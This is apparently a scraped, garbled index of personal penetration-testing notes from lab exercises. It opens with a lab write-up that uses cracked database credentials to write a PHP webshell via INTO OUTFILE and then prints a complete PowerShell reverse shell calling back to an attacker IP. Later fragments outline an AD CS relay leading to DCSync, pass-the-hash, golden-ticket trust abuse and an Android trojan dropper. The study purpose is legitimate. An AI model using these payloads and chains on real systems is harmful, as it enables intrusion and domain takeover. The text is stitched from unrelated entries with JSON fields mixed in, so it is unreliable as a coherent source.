Injection\")Since the cracked credentials worked across services, the next move was connecting directly to the database:mysql -h $target -u fiona -p987654321 --ssl=FALSEThis connected successfully as fiona to a MariaDB 10.4.24 instance. -h specifies the host, -u the username, -p<password> the password (no space between -p and the password when passed this way), and --ssl=FALSE disables SSL/TLS for the connection, which was necessary here.An important terminology correction that came up during this session: what's happening here is not SQL injection, even though it sometimes gets casually called that. True SQL injection is a web application vulnerability — it requires a vulnerable app that takes user-supplied input and drops it, unsanitized, into a SQL query it builds internally, letting an attacker break out of the intended query structure with crafted input (e.g., a login form, a search box, a URL parameter like ?id=1). What actually happened here is much simpler: direct, authenticated access to the database service itself, using valid credentials, through the standard MySQL/MariaDB client. There's no web application involved in this step at all — it's just a database login, functionally no different from SSH-ing in with a valid password.This distinction also matters for methodology: if you don't have direct database credentials and only have a web application in front of you, you'd need to find an actual vulnerable parameter first, confirm it's injectable (does a single quote break the page? does an error message change? does response timing shift with a time-based payload?), and only then would techniques like the one below get appended onto your injected query rather than typed directly into a client.Phase 3 — Writing a Webshell to the Correct Location via SQLTwo checks are worth running before attempting a file write from inside MySQL/MariaDB, since they determine whether it's even possible:sqlSHOW GRANTS FOR CURRENT_USER;\nThis shows the current user's privileges — file read/write from SQL requires the FILE privilege specifically, separate from normal query permissions.sqlSHOW VARIABLES LIKE 'secure_file_priv';\nThis system variable controls where file I/O is allowed: an empty value means no restriction (any path), a specific path means reads/writes are restricted to that directory only, and NULL means the feature is disabled entirely regardless of privileges.With both checks satisfied, the actual write:sqlSELECT \"<?php echo shell_exec($_GET['c']);?>\" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php';Breaking down the mechanics: SELECT \"<?php echo shell_exec($_GET['c']);?>\" is a completely ordinary query that returns a string literal — the fact that the string happens to be valid PHP code is irrelevant to MySQL, it's just text. INTO OUTFILE 'path' is the clause that changes everything: instead of returning that string to the client (your terminal), MySQL writes it to a file at the given path on the server's disk. The double backslashes (\\) are necessary because backslash is MySQL's string-escape character, so \\ inside the string literal produces a single literal \\ in the actual file path — meaning the real path written is C:\\xampp\\htdocs\\test2.php, not C:\\xampp\\htdocs\\test2.php.Why this specific path works where the CoreFTP path didn't: C:\\xampp\\htdocs\\ is Apache's actual document root under this XAMPP installation. Files placed here genuinely get parsed and executed by PHP when requested — unlike the CoreFTP server root used in Mistake #1, which just serves raw bytes. This is the single most important distinction in the whole exercise: two different HTTP-accessible directories on the same machine, only one of which runs PHP.The payload itself, <?php echo shell_exec($_GET['c']);?>, is about as minimal as a webshell gets: it reads a URL parameter named c, passes its value to PHP's shell_exec() function (which runs a string as an OS shell command and returns the output), and echoes that output back into the HTTP response. Visiting test2.php?c=whoami runs whoami on the server and prints the result to the page.The general reasoning chain worth remembering (this generalizes well beyond this one box): once you have arbitrary SQL execution — through valid credentials or through a genuine injection point — ask whether the specific DBMS exposes any filesystem access. For MySQL/MariaDB, the answer is yes: INTO OUTFILE for writing, LOAD_FILE() for reading. Then ask whether there's a web server sharing that same filesystem, with a document root your database user can actually write into. If both are true, write a file there in a format the web server will execute rather than just serve statically — turning a database-level write primitive into full remote code execution reachable over plain HTTP.Other techniques that occupy the same conceptual slot, worth having in the notebook even though they weren't used on this box:LOAD_FILE() — the read-side counterpart of INTO OUTFILE. Useful for reconnaissance before deciding where to write anything: reading configuration files, application source code, /etc/passwd, and so on.User-Defined Functions (UDFs) — MySQL/MariaDB can load a custom compiled library that exposes new SQL functions. The classic example is lib_mysqludf_sys, which adds sys_exec() and sys_eval() — letting you run OS commands directly from a SQL query, with no webshell or web server involved at all. This requires higher privileges than a simple INTO OUTFILE (you need to be able to write the library file into the MySQL plugin directory), but it's a more direct path to command execution when available.Equivalent primitives on other database engines: Microsoft SQL Server has xp_cmdshell, a built-in stored procedure for direct OS command execution (often disabled by default but re-enabled via sp_configure if you have sufficient privileges). PostgreSQL has COPY ... TO/FROM PROGRAM, which pipes query output through — or reads query input from — an arbitrary OS command.Phase 4 — Basic Command Execution Through the WebshellWith test2.php sitting in the real web root, it became reachable and functional over plain HTTP: http://inlanefreight.htb/test2.php?c=dir%20C:\\Users\\Administrator\\DesktopThis  returned a full directory listing, including flag.txt (39 bytes) — confirming working remote code execution as whatever user Apache was running as.Phase 5 — Upgrading to an Interactive Reverse ShellA one-liner webshell like this works fine for single commands, but it's clunky for anything sustained — every command is a separate HTTP request, there's no persistent working state beyond what you explicitly track, and interactive tools don't work at all. The next step was upgrading to a proper interactive reverse shell using a PowerShell payload delivered as a base64-encoded, UTF-16LE string (the format PowerShell's -e / -EncodedCommand flag expects).Before trusting or running any encoded payload, it was decoded first to confirm exactly what it does:echo \"<base64>\" | base64 -d | iconv -f UTF-16LE -t UTF-8Which revealed:powershell$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.211\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()This is a standard Nishang-style PowerShell TCP reverse shell. Walking through what it actually does: it opens a raw TCP connection out to 10.10.14.211 on port 4444 (the attacker's machine and listening port), then enters a loop that reads whatever bytes arrive on that connection, decodes them as ASCII text, executes that text as a PowerShell command via iex (Invoke-Expression), captures both normal output and errors, appends a fake PS <current path>> prompt to mimic an interactive console, encodes the result back to bytes, and writes it back down the same TCP connection. The loop repeats until the connection closes. Functionally, this turns a raw TCP socket into something that behaves like an interactive PowerShell session from the listener's point of view.Prerequisite — the listener has to exist before the payload runs, since the payload connects outward immediately on execution with no retry logic shown:nc -lvnp 4444A delivery gotcha worth remembering: passing this payload through the webshell's c URL parameter means it has to survive being embedded in a URL query string. Base64 output routinely contains +, /, and = characters, all of which have specific reserved meanings inside a URL (+ often means a literal space in query strings, = separates keys from values, / is a path separator) — pasting the raw base64 into a browser address bar or an unescaped URL will corrupt it before it ever reaches the server. The actual working request used percent-encoding for the space between powershell and -e: http://10.129.78.187/test2.php?c=powershell%20-e%20&lt;base64-blob>This  succeeded and produced a persistent, interactive-feeling session — confirmed by the fact that the returned prompt (PS C:\\xampp\\htdocs>) stuck around across multiple subsequent commands rather than appearing once and disappearing, which is what you'd expect from the loop structure seen in the decoded payload above.Phase 6 — Post-Exploitation: Confirming Privilege Levelwhoami\nReturned nt authority\\system — full SYSTEM privileges, the highest local privilege level on Windows.whoami /priv\nReturned a full privilege listing, notably with SeDebugPrivilege, SeImpersonatePrivilege, and SeTcbPrivilege all set to Enabled — consistent with genuine SYSTEM-level access rather than a restricted service account impersonating it.Worth noting for the notebook: XAMPP on Windows is frequently installed and run with its Apache service configured under the SYSTEM account (rather than a dedicated, lower-privileged service account), which is a well-known misconfiguration pattern. It means that getting code execution through the web application at all — via the webshell — immediately hands you SYSTEM, with no separate privilege-escalation phase required. That won't be true on every box, but it's common enough with default XAMPP installs to be worth checking for early.Phase 7 — Locating and Retrieving the FlagThe known path from initial recon was C:\\Users\\Administrator\\Desktop\\flag.txt, retrieved directly through the interactive shell established above.For situations where the exact path isn't already known, the general-purpose version of this search:powershellGet-ChildItem -Recurse -Path C:\\ -Include  flag  -File -ErrorAction SilentlyContinueor, when only matching a single pattern (this is provider-native filtering and generally faster than -Include):powershellGet-ChildItem -Path C:\\ -Recurse -Filter  flag  -File -ErrorAction SilentlyContinue-ErrorAction SilentlyContinue is worth always including on a full-drive recursive search — even under SYSTEM, Windows has certain self-referential junction points and reparse points (like the legacy Documents and Settings compatibility link) that throw access errors during recursion and clutter the output otherwise.Mistake #3 — Repeating Mistake #1 With a Second WebshellLater in the session, a more fully-featured PHP webshell (WhiteWinterWolf's wwwolf-php-webshell) was uploaded using the exact same CoreFTP PUT technique from Phase 1 / Mistake #1:curl -k -X PUT -H \"Host:  http://10.129.78.187 \" --basic -u fiona:987654321 --data-binary @/home/WhiteWinterWolf/wwwolf-php-webshell/webshell.php --path-as-is  https://10.129.78.187/webshell.phpThis  returned HTTP/1.1 200 Ok — the write succeeded. But navigating to  https://10.129.78.187/webshell.php  in a browser just triggered a file download instead of rendering or executing anything. This is exactly the same root cause as Mistake #1: the PUT request went to CoreFTP's own built-in HTTP server (again identifiable via the earlier-seen Server: Core FTP HTTP Server and Content-type: application/octet-stream headers), which has no PHP interpreter behind it and can only ever serve raw bytes.The correct fix, and the one actually applied: since a fully working SYSTEM shell already existed via test2.php at this point, there was no need to fight the CoreFTP PUT route for this second webshell at all. The existing shell could simply be used to place the file directly into C:\\xampp\\htdocs\\ instead — for example, hosting the file from the attacker box with python3 -m http.server, then pulling it down from inside the target's PowerShell session with Invoke-WebRequest. Once code execution exists through any path, that path becomes the easiest way to deliver everything else, rather than continuing to route new files through a vulnerability that was never going to execute them in the first place.Reference — LOAD_FILE() for File Reads (Discussed, Not Needed on This Box)Since command execution was already achieved by this point, this wasn't actually needed to solve the box — but it's a core technique worth having fully documented for future engagements where SQL access (or an LFI) is the only foothold available, with no RCE yet.Direct form, when the target path is already known:sqlSELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\flag.txt');Discovery form, used when the absolute path isn't known in advance:sqlSELECT LOAD_FILE(CONCAT(@@basedir, 'Path_to_the_flag\\flag.txt'));@@basedir is a MySQL/MariaDB system variable holding the database software's own installation directory (e.g., C:\\xampp\\mysql\\ on a XAMPP install). Since you always know this value with certainty once connected, it functions as a confirmed anchor point — a real, verified path you can build guesses or traversal off of, rather than blindly guessing an entire absolute path from nothing.The same two prerequisite checks from Phase 3 apply here (FILE privilege, secure_file_priv), plus one extra wrinkle specific to reads: the target file also has to be OS-readable by whichever account the MySQL/MariaDB service itself runs as — not the database user you're logged in as. If the service account can't read the file (say, it's ACL'd to Administrator only), LOAD_FILE just silently returns NULL, even with correct SQL-level privileges and no secure_file_priv restriction blocking the path.General methodology for blind file discovery, when you have a file-read primitive but don't know the layout: fingerprint the OS and version first (SELECT @@version_compile_os;, SELECT @@version;), since that narrows down which default paths are worth trying. Lean on well-known default install locations — C:\\xampp, C:\\wamp64\\www, C:\\inetpub\\wwwroot\\ on Windows; /var/www/html/, /etc/ on Linux. Use a small, guaranteed-to-exist file as an initial probe to confirm read access works at all before worrying about anything specific — C:\\Windows\\win.ini on Windows, /etc/passwd on Linux, are both classic choices. Remember that LOAD_FILE() cannot list directory contents — it can only read an exact filename you already have — so for user-specific paths like C:\\Users&lt;name>\\Desktop, the username has to come from somewhere else entirely (SMB enumeration, RID cycling, earlier recon, or just trying very common defaults like Administrator). And prefer combining multiple recon channels over pure blind guessing — verbose error messages, stack traces, exposed .git directories, and misconfigured directory listings frequently leak full server paths for free. Finally: the moment actual command execution is available, this entire blind-guessing approach becomes unnecessary — direct directory listing (dir / Get-ChildItem) is strictly faster and more reliable than reading one guessed file at a time through SQL.Full Mistake RecapMistake 1 (made twice): treated a successful file write via CoreFTP's PUT vulnerability as equivalent to code execution. It isn't — that PUT lands in CoreFTP's own server root, which has no PHP interpreter and only ever serves raw bytes. Happened first with the initial shell.php, and again later with the WhiteWinterWolf webshell. Root cause both times: confusing \"the file was written successfully\" with \"the file will be executed.\"Mistake 2: misread a local curl error (Failed to open shell.php, caused by --data-binary @shell.php looking for a local file that wasn't in the current directory) as a server-side or network problem, when it had nothing to do with the target at all.Mistake 3 (terminology): referred to direct, authenticated MySQL/MariaDB client access — using valid, cracked credentials — as \"SQL injection.\" That term specifically describes exploiting a vulnerable web application's own query construction; this was just a database login, no web app or injection involved.\nMedium was easier.\nit was ftp hiding on 30021 and it allowed anonymous access where I found .txtfile with credentials. after that I brute forced ftp on port 2121 for user simon and found credentials. there I found flag.","description":"As we've seen, email attacks can lead to sensitive data disclosure through direct access to a user's inbox or by combining a misconfiguration with a convincing phishing email. The CA runs a web‑enrollment page over HTTP ( /certsrv ). Windows machine accounts will happily NTLM‑authenticate to you if you  coerce  them. You force the  Domain Controller's  machine account ( DC01$ ) to authenticate to your relay, using PetitPotam/PrinterBug. The relay catches  DC01$ 's auth and the CA hands you a  certificate for  DC01$ .\nPKINIT.  You convert that  DC01$  certificate into a  Kerberos TGT  for  DC01$  ( gettgtpkinit ).\nDCSync.   DC01$  is a Domain Controller account, so it has directory‑replication rights. Acting as  DC01$ , you ask the DC to replicate the  Administrator's password hash  to you ( secretsdump ). This is DCSync — you're pretending to be another DC syncing data.\nPass‑the‑Hash.  You log in as  Administrator  using that NT hash (no plaintext password needed) and read the flag.\nWhy coerce the DC and not the CA? Because only a  Domain Controller  account can DCSync. Mental model — what a \"dropper\" is and why malware comes in stages","href":"/research/android-malware-walkthrough#1-mental-model-—-what-a-dropper-is-and-why-malware-comes-in-stages","route":"research/android-malware-walkthrough","trail":"Android Banking Trojan: Reverse-Engineering Walkthrough","kind":"Section","source":"Research/Reverse-Engineering a Multi-Stage Android Banking Trojan Full Walkthrough.md","subject":"practice","derived":false,"sourceCapture":false,"body":"Before any commands, the concept. Modern Android malware is almost never a single self-contained app. It is built in  stages , and understanding why explains every obfuscation trick we later had to defeat.\nStage 1 — the dropper.  A small, innocent-looking app. Its  only  job is to get installed and then unpack/install the real payload. Because it does so little and asks for so few permissions, antivirus engines and the Play Store's scanners often wave it through. Ours asked for just two permissions:  INTERNET  and  REQUEST_INSTALL_PACKAGES . That second one is the tell — it means \"I want to install other apps.\"\nStage 2 — the payload.  The actual banking trojan, carried  inside  the dropper as an encrypted blob (an asset file). It never appears as a real APK on disk until the dropper decrypts and installs it. AV can't scan what it can't see.\nStage 3 — the real code.  Even stage 2 is a shell. The genuinely malicious classes live in  another  encrypted blob inside stage 2, decrypted only at runtime by a native library. This is called  packing : the code is wrapped in layers so that static analysis of the APK shows almost nothing useful.\nEach layer is encrypted with a different key and sometimes a different algorithm. The attacker's goal is to make an analyst give up. Our entire job was to peel these layers one at a time.\nThe reason this layering works:  an antivirus engine scanning the original APK sees an encrypted blob with no recognisable code. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a \"ticket\" that permits us to access the requested resource (i.e., a single machine). Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the Remote Management Users group on DEV01. We want to use PowerView to enumerate the domain, which requires communication with the Domain Controller, DC01.\nDiagram showing attack path: Attack Host to Dev01 (First Hop), then to DC01 (Second Hop).\nWhen we connect to DEV01 using a tool such as evil-winrm, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as PowerView and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.\nIf unconstrained delegation is enabled on a server, it is likely we won't face the \"Double Hop\" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGT ticket is cached, which has the ability to sign TGS tickets and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.","description":"The \"Double Hop\" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.\nThis blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.\nLet's walk through the attack. First off, we need to start ntlmrelayx.py in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, domain compromise, and even as a persistence mechanism within the domain. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:\nParent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.\nCross-link: A trust between child domains to speed up authentication.\nExternal: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.\nTree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.\nForest: A transitive trust between two forest root domains.\nESAE: A bastion forest used to manage Active Directory.\nWhen establishing a trust, certain elements can be modified depending on the business case.\nTrusts can be transitive or non-transitive.\nA transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.\nIn a non-transitive trust, the child domain itself is the only one trusted.\nDiagram of servers A, B, C representing domains a.com, b.com, c.com, illustrating A=B, B=C, thus A=C.\nAdapted from here","description":"A trust is used to many | Direct trust\nThe trust is shared with anyone in the forest | Not extended to next level child domains\nForest, tree-root, parent-child, and cross-link trusts are transitive | Typical for external or custom trust setups\nAn easy comparison to make can be package delivery to your house. For a transitive trust, you have extended the permission to anyone in your household (forest) to accept a package on your behalf. For a non-transitive trust, you have given strict orders with the package that no one other than the delivery service and you can handle the package, and only you can sign for it.\nTrusts can be set up in two directions: one-way or two-way (bidirectional).\nOne-way trust: Users in a trusted domain can access resources in a trusting domain, not vice-versa.\nBidirectional trust: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.\nDomain trusts are often set up incorrectly and can provide us with critical unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications if security is not considered before establishing the trust relationship. A Merger & Acquisition (M&A) between two companies can result in bidirectional trusts with acquired companies, which can unknowingly introduce risk into the acquiring company’s environment if the security posture of the acquired company is unknown and untested. If someone wanted to target your organization, they could also look at the other company you acquired for a potentially softer target to attack, allowing them to get into your organization indirectly. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain. I have performed many penetration tests where this was the case: I was unable to find a foothold in the principal domain, but was able to find a flaw in a trusted domain which, in turn, gave me a foothold, or even full admin rights in the principal domain. This type of \"end-around\" attack could be prevented if security is considered as paramount before establishing any kind of domain trust. As we examine trust relationships, keep these thoughts in mind for reporting. Often, we will find that the larger organization is unaware that a trust relationship exists with one or more domains.\nBelow is a graphical representation of the various trust types.\nDiagram of Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.\nTo perform this attack after compromising a child domain, we need the following:\nThe KRBTGT hash for the child domain\nThe SID for the child domain\nThe name of a target user in the child domain (does not need to exist!)\nThe FQDN of the child domain.\nThe SID of the Enterprise Admins group of the root domain.\nWith this data collected, the attack can be performed with Mimikatz.\nNow we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.\nSince we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.","description":"This attack allows for the compromise of a parent domain once the child domain has been compromised. Each tag corresponds with a section of the Enterprise ATT&CK Matrix found here. Any tag marked as TA corresponds to an overarching tactic, while a tag marked as T### is a technique found in the matrix under tactics.\nTTP | MITRE Tag | Description\nExternal Reconnaissance | T1589 | This portion of an attack is extremely hard to detect and defend against. An attacker does not have to interact with your enterprise environment directly, so it's impossible to tell when it is happening. What can be done is to monitor and control the data you release publically to the world. Job postings, documents (and the metadata left attached), and other open information sources like BGP and DNS records all reveal something about your enterprise. Taking care to scrub documents before release can ensure an attacker cannot glean user naming context from them as an example. The same can be said for not providing detailed information about tools and equipment utilized in your networks via job postings.\nInternal Reconnaissance | T1595 | For reconnaissance of our internal networks, we have more options. This is often considered an active phase and, as such, will generate network traffic which we can monitor and place defenses based on what we see. Monitoring network traffic for any suspicious bursts of packets of a large volume from any one source or several sources can be indicative of scanning. A properly configured Firewall or Network Intrusion Detection System (NIDS) will spot these trends quickly and alert on the traffic. Depending on the tool or appliance, it may even be able to add a rule blocking traffic from said hosts proactively. The utilization of network monitoring coupled with a SIEM can be crucial to spotting reconnaissance. Properly tuning the Windows Firewall settings or your EDR of choice to not respond to ICMP traffic, among other types of traffic, can help deny an attacker any information they may glean from the results.\nPoisoning | T1557 | Utilizing security options like SMB message signing and encrypting traffic with a strong encryption mechanism will go a long way to stopping poisoning & man-in-the-middle attacks. SMB signing utilizes hashed authentication codes and verifies the identity of the sender and recipient of the packet. These actions will break relay attacks since the attacker is just spoofing traffic.\nPassword Spraying | T1110/003 | This action is perhaps the easiest to defend against and detect. Simple logging and monitoring can tip you off to password spraying attacks in your network. Watching your logs for multiple attempts to login by watching Event IDs 4624 and 4648 for strings of invalid attempts can tip you off to password spraying or brute force attempts to access the host. Having strong password policies, an account lockout policy set, and utilizing two-factor or multi-factor authentication can all help prevent the success of a password spray attack. For a deeper look at the recommended policy settings, check out this article and the NIST documentation.\nCredentialed Enumeration | TA0006 | There is no real defense you can put in place to stop this method of attack. Once an attacker has valid credentials, they effectively can perform any action that the user is allowed to do. A vigilant defender can detect and put a stop to this, however. Monitoring for unusual activity such as issuing commands from the CLI when a user should not have a need to utilize it. Multiple RDP requests sent from host to host within the network or movement of files from various hosts can all help tip a defender off. If an attacker manages to acquire administrative privileges, this can become much more difficult, but there are network heuristics tools that can be put in place to analyze the network constantly for anomalous activity. Network segmentation can help a lot here.\nLOTL | N/A | It can be hard to spot an attacker while they are utilizing the resources built-in to host operating systems. This is where having a baseline of network traffic and user behavior comes in handy. If your defenders understand what the day-to-day regular network activity looks like, you have a chance to spot the abnormal. Watching for command shells and utilizing a properly configured Applocker policy can help prevent the use of applications and tools users should not have access to or need.\nKerberoasting | T1558/003 | Kerberoasting as an attack technique is widely documented, and there are plenty of ways to spot it and defend against it. The number one way to protect against Kerberoasting is to utilize a stronger encryption scheme than RC4 for Kerberos authentication mechanisms. Enforcing strong password policies can help prevent Kerberoasting attacks from being successful. Utilizing Group Managed service accounts is probably the best defense as this makes Kerberoasting no longer possible. Periodically auditing your users' account permissions for excessive group membership can be an effective way to spot issues.","description":"As a different look at this, we have broken out the significant actions by section and correlated controls based on the TTP and a MITRE tag. encrypted) is the protocol that  sends/relays  mail.
